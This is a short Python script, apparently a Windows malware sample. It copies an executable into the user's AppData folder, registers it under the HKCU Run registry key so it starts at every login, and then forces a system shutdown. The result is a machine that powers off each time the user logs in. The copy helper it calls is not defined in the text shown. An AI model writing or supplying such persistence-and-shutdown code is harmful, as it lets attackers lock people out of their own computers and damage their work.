import os 
import time
import subprocess

def add_to_registry():
    new_file = os.environ["appdata"] + "\\program.exe"

    if not os.path.exists(new_file):
        copy_exefile_to_another_location(new_file)
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v program /t REG_SZ /d " + new_file
        subprocess.call(regedit_command, shell=True)

add_to_registry()
time.sleep(2)
os.system('shutdown -s')
